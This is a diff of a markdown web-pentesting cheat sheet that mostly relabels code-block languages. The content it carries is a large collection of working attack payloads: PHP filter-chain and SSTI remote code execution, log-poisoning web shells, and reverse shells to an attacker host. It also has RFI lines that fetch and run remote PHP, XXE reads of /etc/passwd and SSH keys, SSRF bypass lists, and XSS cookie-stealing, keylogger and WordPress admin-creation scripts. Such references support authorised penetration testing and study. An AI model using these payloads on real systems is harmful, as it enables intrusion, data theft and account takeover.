@@ -3613,7 +5055,7 @@ $ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 
 > https://www.php.net/manual/en/ref.filesystem.php
 
-```c
+```console
 +----------------+-----------------+----------------+----------------+
 |    Command     | Displays Output | Can Get Output | Gets Exit Code |
 +----------------+-----------------+----------------+----------------+
@@ -3627,13 +5069,13 @@ $ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 
 ### phpinfo.phar
 
-```c
+```php
 <?php phpinfo(); ?>
 ```
 
 ### phpinfo Dump
 
-```c
+```console
 file_put_contents to put <?php phpinfo(); ?>
 ```
 
@@ -3641,7 +5083,7 @@ file_put_contents to put <?php phpinfo(); ?>
 
 > https://gist.github.com/jaquen/aab510eead65c9c95aa20a69d89c9d2a?s=09
 
-```c
+```php
 <?php
 
 // A script to check what you can use for RCE on a target
@@ -3684,7 +5126,7 @@ foreach ($functions_to_test as $func) {
 
 #### Common Payloads
 
-```c
+```console
 $ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 $ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
 $ python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
@@ -3694,13 +5136,13 @@ $ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'b
 
 #### Payload Execution
 
-```c
+```console
 http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
 ```
 
 OR
 
-```c
+```console
 $ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 [+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
@@ -3708,11 +5150,11 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->
 
 #### Curl Example
 
-```c
+```console
 $ python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > <FILE>
 ```
 
-```c
+```console
 $ curl "http://<RHOST>/index.php?file=$(cat <FILE>)"
 ```
 
@@ -3720,18 +5162,18 @@ $ curl "http://<RHOST>/index.php?file=$(cat <FILE>)"
 
 #### Finding PHP Deserialization Vulnerability
 
-```c
+```console
 $ grep -R serialize
 ```
 
-```c
+```console
 /index.php:        base64_encode(serialize($page)),
 /index.php:unserialize($cookie);
 ```
 
 #### Skeleton Payload
 
-```c
+```php
 if (empty($_COOKIE['PHPSESSID']))
 {
     $page = new PageModel;
@@ -3748,14 +5190,14 @@ if (empty($_COOKIE['PHPSESSID']))
 
 #### Decoding and Web Server Poisoning
 
-```c
+```console
 $ echo "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9" | base64 -d
 O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
 ```
 
 #### Encoding
 
-```c
+```console
 $ python
 Python 2.7.18 (default, Apr 28 2021, 17:39:59) 
 [GCC 10.2.1 20210110] on linux2
@@ -3764,14 +5206,14 @@ Type "help", "copyright", "credits" or "license" for more information.
 15
 ```
 
-```c
+```console
 $ echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64
 Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
 ```
 
 #### Skeleton Payload Request
 
-```c
+```console
 GET / HTTP/1.1
 Host: <RHOST>:<RPORT>
 User-Agent: <?php system('cat /');?>
@@ -3789,7 +5231,7 @@ Cache-Control: max-age=0
 
 #### Exploiting eval() base64 payload
 
-```c
+```console
 ${system(base64_decode(b64-encoded-command))}
 ```
 
@@ -3799,7 +5241,7 @@ ${system(base64_decode(b64-encoded-command))}
 
 #### Dropping a File
 
-```c
+```console
 $ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
 ```
 
@@ -3807,7 +5249,7 @@ $ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.
 
 #### Skeleton Payload Request
 
-```c
+```console
 POST /profilepicture.php HTTP/1.1
 ...
 Connection: close
@@ -3819,7 +5261,7 @@ Upgrade-Insecure-Requests: 1
 
 #### Payloads
 
-```c
+```console
 url=/etc/passwd
 url=file:////home/<USERNAME>/.ssh/authorized_keys
 <?php print exec(ls) ?>
@@ -3831,13 +5273,13 @@ url=file:////home/<USERNAME>/.ssh/authorized_keys
 
 > https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
 
-```c
+```console
 pattern=/ip_address/e&ipaddress=system('id')&text="openvpn": {
 ```
 
 #### Remote Code Execution
 
-```c
+```console
 POST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1
 Host: <RHOST>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -3858,7 +5300,7 @@ swearwords%5B%2Ffuck%2Fi%5D=make+love&swearwords%5B%2Fshit%2Fi%5D=poop&swearword
 
 #### Skeleton Payload Request
 
-```c
+```console
 POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=ls HTTP/1.1
 Host: <RHOST>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -3880,7 +5322,7 @@ de=1
 
 #### Bypass
 
-```c
+```php
 if (!empty($_POST['username']) && !empty($_POST['password'])) {
     require('config.php');
     if (strcmp($username, $_POST['username']) == 0) {
@@ -3910,13 +5352,13 @@ The correct way to write this would be with the === operator which checks both v
 
 Change `POST` data as follows to bypass the login.
 
-```c
+```console
 username[]=admin&password[]=admin
 ```
 
 ### PHP verb File Upload
 
-```c
+```console
 $ curl -X PUT -d '<?php system($_GET["c"]);?>' http://<RHOST>/<FILE>.php
 ```
 
@@ -3928,19 +5370,19 @@ $ curl -X PUT -d '<?php system($_GET["c"]);?>' http://<RHOST>/<FILE>.php
 
 ### Example
 
-```c
+```console
 %00
 ```
 
 ### Bypass
 
-```c
+```console
 $ curl http://<RHOST>/ftp/package.json.bak%2500.md
 ```
 
 ## Remote File Inclusion (RFI)
 
-```c
+```console
 $ http://<RHOST>/PATH/TO/FILE/?page=http://<RHOST>/<FILE>.php
 $ http://<RHOST>/index.php?page=' and die(system("curl http://<LHOST>/<FILE>.php|php")) or '
 $ http://<RHOST>/index.php?page=%27%20and%20die(system(%22curl%20http://<LHOST>/<FILE>.php|php%22))%20or%20%27
@@ -3948,13 +5390,13 @@ $ http://<RHOST>/index.php?page=%27%20and%20die(system(%22curl%20http://<LHOST>/
 
 ### Root Cause Function
 
-```c
+```console
 allow_url_fopen
 ```
 
 ### Code Execution
 
-```c
+```console
 $ User-Agent: <?system('wget http://<LHOST>/<FILE>.php -O <FILE>.php');?>
 $ http://<RHOST>/view.php?page=../../../../../proc/self/environ
 ```
@@ -3970,7 +5412,7 @@ $ http://<RHOST>/page=http://<LHOST>/<SHELL>.php?
 
 ### &x=
 
-```c
+```console
 $ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
 ```
 
@@ -3978,7 +5420,7 @@ The payload ending in `&x=` is being used to stop the remaining path from being 
 
 ### 0-Cut Bypass
 
-```c
+```console
 http://1.1          // http://1.0.0.1
 http://127.0.0.1    // http://127.1.1
 http://192.168.1    // http://192.168.0.1
@@ -3986,7 +5428,7 @@ http://192.168.1    // http://192.168.0.1
 
 ### Bypass List
 
-```c
+```console
 http://localhost
 http://127.0.0.1
 http://2130706433
@@ -4042,7 +5484,7 @@ X-True-IP: 127.0.0.1
 
 ### Server-Side Request Forgery Mass Bypass
 
-```c
+```console
 Base-Url: 127.0.0.1
 Client-IP: 127.0.0.1
 Http-Url: 127.0.0.1
@@ -4091,7 +5533,7 @@ X-True-IP: 127.0.0.1
 
 > https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
 
-```c
+```console
 url=http%3A%2F%2F<LHOST>+-H+"asdf;"+-d+"@/etc/passwd"
 ```
 
@@ -4101,7 +5543,7 @@ url=http%3A%2F%2F<LHOST>+-H+"asdf;"+-d+"@/etc/passwd"
 
 > https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
 
-```c
+```console
 ${{<%[%'"}}%\.
 ```
 
@@ -4109,31 +5551,31 @@ ${{<%[%'"}}%\.
 
 > https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 
-```c
+```console
 {{ ‘’.__class__.__mro__[1].__subclasses__() }}
 ```
 
 ### Jinja
 
-```c
+```console
 {{malicious()}}
 ```
 
 ### Jinja2
 
-```c
+```console
 </title></item>{{4*4}}
 ```
 
 ### Payload
 
-```c
+```console
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 
 ### Payload
 
-```c
+```console
 {{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
 ```
 
@@ -4141,25 +5583,25 @@ ${{<%[%'"}}%\.
 
 #### Config
 
-```c
+```console
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
 ```
 
 #### Load Evil Config
 
-```c
+```console
 {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
 ```
 
 #### Connect to Evil Host
 
-```c
+```console
 {{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',shell=True) }}
 ```
 
 #### Example
 
-```c
+```console
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
@@ -4171,7 +5613,7 @@ ${{<%[%'"}}%\.
 
 ### Check manually for vulnerable Subdomains
 
-```c
+```console
 $ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
 ```
 
@@ -4183,13 +5625,13 @@ $ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
 
 ###### CNAME
 
-```c
+```console
 <SUBDOMAIN>.<DOMAIN>
 ```
 
 ###### 2fchn734865gh234356h668j4dsrtbse9056gh405.html
 
-```c
+```console
 <!-- PoC by Red Team -->
 ```
 
@@ -4199,7 +5641,7 @@ $ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
 
 ### Enumeration
 
-```c
+```console
 http://<RHOST>/_profiler
 http://<RHOST>/app_dev.php/_profiler
 http://<RHOST>/app_dev.php
@@ -4211,7 +5653,7 @@ http://<RHOST>/app_dev.php/_profiler/open?file=app/config/parameters.yml
 
 > https://github.com/ambionics/symfony-exploits
 
-```c
+```console
 $ python3 secret_fragment_exploit.py 'http://<RHOST>/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://<RHOST>/_fragment' --function system --parameters 'id'
 ```
 
@@ -4219,7 +5661,7 @@ $ python3 secret_fragment_exploit.py 'http://<RHOST>/_fragment' --method 2 --sec
 
 > https://github.com/tomnomnom/unfurl
 
-```c
+```console
 $ go install github.com/tomnomnom/unfurl@latest
 ```
 
@@ -4227,7 +5669,7 @@ $ go install github.com/tomnomnom/unfurl@latest
 
 > https://github.com/s0md3v/uro
 
-```c
+```console
 $ pipx install uro
 ```
 
@@ -4235,7 +5677,7 @@ $ pipx install uro
 
 ### Java Server Pages (JSP) Filter Bypass
 
-```c
+```console
 .MF
 .jspx
 .jspf
@@ -4249,7 +5691,7 @@ $ pipx install uro
 
 ### PHP Filter Bypass
 
-```c
+```console
 .sh
 .cgi
 .inc
@@ -4274,7 +5716,7 @@ $ pipx install uro
 
 ### Content-Types
 
-```c
+```console
 Content-Type : image/gif
 Content-Type : image/png
 Content-Type : image/jpeg
@@ -4284,13 +5726,13 @@ Content-Type : image/jpeg
 
 #### Null Bytes
 
-```c
+```console
 $ mv <FILE>.jpg <FILE>.php\x00.jpg
 ```
 
 #### More Bypass Examples
 
-```c
+```console
 <FILE>.php%20
 <FILE>.php%0d%0a.jpg
 <FILE>.php%0a
@@ -4305,7 +5747,7 @@ $ mv <FILE>.jpg <FILE>.php\x00.jpg
 
 ## Upload Vulnerabilities
 
-```c
+```console
 ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
 SVG: Stored XSS / Server-Side Request Forgery
 GIF: Stored XSS
@@ -4322,7 +5764,7 @@ PDF / PPTX: Server-Side Request Forgery / Blind XXE
 
 > https://github.com/tomnomnom/waybackurls
 
-```c
+```console
 $ go install github.com/tomnomnom/waybackurls@latest
 ```
 
@@ -4330,13 +5772,13 @@ $ go install github.com/tomnomnom/waybackurls@latest
 
 ### Frameworks
 
-```c
+```console
 - \x09       // Spring Framework
 - \xA0       // Express Framework
 - \x1C-1F    // Flask
 ```
 
-```c
+```console
 GET /wp-login.php\xA0 HTTP/1.1
 
 200 OK
@@ -4346,33 +5788,33 @@ GET /wp-login.php\xA0 HTTP/1.1
 
 ### Web Shell
 
-```c
+```console
 $ nc <RHOST> 80
 ```
 
-```c
+```console
 GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
 Host: <RHOST>
 Connection: close
 ```
 
-```c
+```console
 http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log&cmd=id
 ```
 
 ### Code Execution
 
-```c
+```console
 $ nc <RHOST> 80
 ```
 
-```c
+```console
 GET /<?php passthru('id'); ?> HTTP/1.1
 Host: <RHOST>
 Connection: close
 ```
 
-```c
+```console
 http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log
 ```
 
@@ -4382,7 +5824,7 @@ http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log
 
 - Disable `Update Content-Length`
 
-```c
+```console
 GET /socket HTTP/1.1
 Host: <RHOST>:<RPORT>
 Sec-WebSocket-Version: 777
@@ -4400,7 +5842,7 @@ Host: <RHOST>:<RPORT>
 
 #### Fake Webserver
 
-```c
+```python
 import sys
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
@@ -4419,11 +5861,11 @@ class Redirect(BaseHTTPRequestHandler):
 HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
 ```
 
-```c
+```console
 $ python3 webserver.py <LPORT>
 ```
 
-```c
+```console
 GET /check-url?server=http://<LHOST>:<LPORT> HTTP/1.1
 Host: <RHOST>:<RPORT>
 Sec-WebSocket-Version: 13
@@ -4441,48 +5883,48 @@ Host: <RHOST>:<RPORT>
 
 > https://github.com/xmendez/wfuzz
 
-```c
+```console
 $ wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
 ```
 
 ### Write to File
 
-```c
+```console
 $ wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
 ```
 
 ### Custom Scan with limited Output
 
-```c
+```console
 $ wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
 ```
 
 ### Fuzzing two Parameters at once
 
-```c
+```console
 $ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
 ```
 
 ### Domain
 
-```c
+```console
 $ wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
 ```
 
 ### Subdomain
 
-```c
+```console
 $ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
 ```
 
 ### Git
 
-```c
+```console
 $ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
 ```
 ### Login
 
-```c
+```console
 $ wfuzz -c -z file,usernames.txt -z file,passwords.txt -u http://<RHOST>/login.php -d "username=FUZZ&password=FUZ2Z" --hs "Login failed!"
 $ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
 $ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
@@ -4490,13 +5932,13 @@ $ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password
 
 ### SQL
 
-```c
+```console
 $ wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
 ```
 
 ### DNS
 
-```c
+```console
 $ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
 $ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
 $ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
@@ -4504,21 +5946,27 @@ $ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million
 
 ### Numbering Files
 
-```c
+```console
 $ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
 ```
 
 ### Enumerating PIDs
 
-```c
+```console
 $ wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
+```
+
+### Server-Side Request Forgery (SSRF) Enumeration
+
+```console
+$ wfuzz -c -z range,1-65535 --hh 0 -b "token=<TOKEN>" 'http://<RHOST>/api/status?url="http://localhost:FUZZ/"'
 ```
 
 ## WhatWeb
 
 > https://github.com/urbanadventurer/WhatWeb
 
-```c
+```console
 $ whatweb -v -a 3 <RHOST>
 ```
 
@@ -4526,13 +5974,13 @@ $ whatweb -v -a 3 <RHOST>
 
 ### Config Path
 
-```c
+```console
 /var/www/wordpress/wp-config.php
 ```
 
 ## WPScan
 
-```c
+```console
 $ wpscan --url https://<RHOST> --enumerate u,t,p
 $ wpscan --url https://<RHOST> --plugins-detection aggressive
 $ wpscan --url https://<RHOST> --disable-tls-checks
@@ -4544,13 +5992,13 @@ $ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
 
 ### Generating Payload
 
-```c
+```console
 $ python3 wrapwrap.py /etc/passwd "GIF89a" "" 1000
 ```
 
 ### Payload Execution
 
-```c
+```console
 $ curl 'http://<RHOST>/wp-admin/admin-ajax.php' -H "Content-Type: application/x-www-form-urlencoded" -d 'action=upload_image_from_url&id=1&url=php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd&accepted_files=image/gif'
 ```
 
@@ -4562,7 +6010,7 @@ Possible JSON Implementation
 
 ### Skeleton Payload Request
 
-```c
+```console
 GET / HTTP/1.1
 Host: <RHOST>:<RPORT>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -4578,20 +6026,20 @@ Content-Length: 136
 
 ### Payloads
 
-```c
+```console
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
  <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
 ```
 
-```c
+```console
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
 ```
 
-```c
+```console
 username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
 ```
 
-```c
+```console
 {% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\
 x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAxIDA+JjEK | base64 -d | b
 ash")["read"]() %} a {% endwith %}
@@ -4601,7 +6049,7 @@ ash")["read"]() %} a {% endwith %}
 
 > https://github.com/0xInfection/XSRFProbe
 
-```c
+```console
 $ xsrfprobe -u https://<RHOST> --crawl --display
 ```
 
@@ -4611,7 +6059,7 @@ aka JavaScript Injection.
 
 ### Common Payloads
 
-```c
+```javascript
 <sCrIpt>alert(1)</ScRipt>
 <script>alert('XSS');</script>
 <script>user.changeEmail('user@domain');</script>
@@ -4623,7 +6071,7 @@ aka JavaScript Injection.
 
 ### Cookie Stealing
 
-```c
+```javascript
 <script>alert(document.cookies)</script>
 <iframe onload="fetch('http://<LHOST>/?c='+document.cookie)">
 <img src=x onerror="location.href='http://<LHOST>/?c='+ document.cookie">
@@ -4634,7 +6082,7 @@ aka JavaScript Injection.
 
 Note that `HTML tags` that need to be closed for `XSS`.
 
-```c
+```console
 <!--
 <title>
 <textarea>
@@ -4645,44 +6093,44 @@ Note that `HTML tags` that need to be closed for `XSS`.
 <noembed>
 ```
 
-```c
+```console
 --></title></textarea></style></noscript></script></xmp></template></noembed><svg/onload=alert()>
 ```
 
 ### Single Domain One-liner
 
-```c
+```console
 $ echo https://<DOMAIN>/ | gau | gf xss | uro | Gxss | kxss | tee <FILE>.txt
 ```
 
 ### Reflected XSS
 
-```c
+```javascript
 <script>alert('XSS');</script>
 <script>alert(document.cookies)</script>
 ```
 
 ### Reflected XSS at Scale
 
-```c
+```console
 $ subfinder -d <RHOST> -silent -all | httpx -silent | nuclei -tags xss -exclude-severity info -rl 20 -c 10 -o /PATH/TO/FILE/<FILE>
 ```
 
 ### Stored XSS
 
-```c
+```javascript
 <script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
 ```
 
 ### Session Stealing
 
-```c
+```javascript
 <script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
 ```
 
 ### Key Logger
 
-```c
+```javascript
 <script>document.onkeypress = function(e) { fetch('https://<RHOST>/log?key=' + btoa(e.key) );}</script>
 ```
 
@@ -4690,19 +6138,19 @@ $ subfinder -d <RHOST> -silent -all | httpx -silent | nuclei -tags xss -exclude-
 
 JavaScript is calling `user.changeEmail()`. This can be abused.
 
-```c
+```javascript
 <script>user.changeEmail('user@domain');</script>
 ```
 
 ### Polyglot
 
-```c
+```javascript
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
 
 ### Single XSS Vector
 
-```c
+```javascript
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 ```
 
@@ -4710,7 +6158,7 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 
 #### Main sinks that can lead to DOM-XSS Vulnerabilities
 
-```c
+```console
 ## document.write()
 ## document.writeln()
 ## document.domain
@@ -4722,7 +6170,7 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 
 ### jQuery Function sinks that can lead to DOM-XSS Vulnerabilities
 
-```c
+```console
 ## add()
 ## after()
 ## append()
@@ -4747,7 +6195,7 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 
 ### Skeleton Payload Request
 
-```c
+```console
 POST /blog-single.php HTTP/1.1
 Host: <RHOST>
 User-Agent: <script src="http://<LHOST>:<LPORT>/test.html"></script>
@@ -4770,7 +6218,7 @@ src="http://<LHOST>:<LPORT>/test.html"></script>&submit=submit
 
 #### XSS post request on behalf of the Victim, with custom Cookies.
 
-```c
+```javascript
 var xhr = new XMLHttpRequest();
 document.cookie = "key=value;";
 var uri ="<RHOST>";
@@ -4784,7 +6232,7 @@ xhr.send("<BODY>");
 
 #### XSS web Request on behalf of Victim and sends back the complete Webpage.
 
-```c
+```javascript
 xmlhttp = new XMLHttpRequest();
 xmlhttp.onload = function() {
   x = new XMLHttpRequest();
@@ -4799,13 +6247,13 @@ xmlhttp.send(null);
 
 #### Reverse JavaScript Execution
 
-```c
+```javascript
 <a href="javascript:fetch('http://<RHOST>/<FILE>').then(r=>r.text()).then(d=>fetch('http://<LHOST>/?response='+encodeURIComponent(d))).catch(e=>console.error('Error:',e));"><COMMENT></a>
 ```
 
 #### InfoStealer
 
-```c
+```javascript
 for (let uid = 1; uid <= 15; uid++) {
   fetch(`http://<RHOST>/`)
     .then(r => r.text())
@@ -4822,7 +6270,7 @@ for (let uid = 1; uid <= 15; uid++) {
 
 #### Trigger
 
-```c
+```javascript
 document.body.appendChild(Object.assign(document.createElement('script'),{src:'http://<LHOST>/<FILE>.js'})) foo=bar">
   Foo
 </body>&content=html&recipient=<EMAIL>
@@ -4832,13 +6280,13 @@ document.body.appendChild(Object.assign(document.createElement('script'),{src:'h
 
 ##### Request Example
 
-```c
+```javascript
 <a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
 ```
 
 ##### Get nonce
 
-```c
+```javascript
 var ajaxRequest = new XMLHttpRequest();
 var requestURL = "/wp-admin/user-new.php";
 var nonceRegex = /ser" value="([^"]*?)"/g;
@@ -4850,7 +6298,7 @@ var nonce = nonceMatch[1];
 
 ##### Update Payload Script
 
-```c
+```javascript
 var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
 ajaxRequest = new XMLHttpRequest();
 ajaxRequest.open("POST", requestURL, true);
@@ -4862,13 +6310,13 @@ ajaxRequest.send(params);
 
 > https://jscompress.com/
 
-```c
+```javascript
 var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
 ```
 
 ###### Encoding Function
 
-```c
+```javascript
 function encode_to_javascript(string) {
             var input = string
             var output = '';
@@ -4887,13 +6335,13 @@ console.log(encoded)
 
 ###### Encoded Payload
 
-```c
+```console
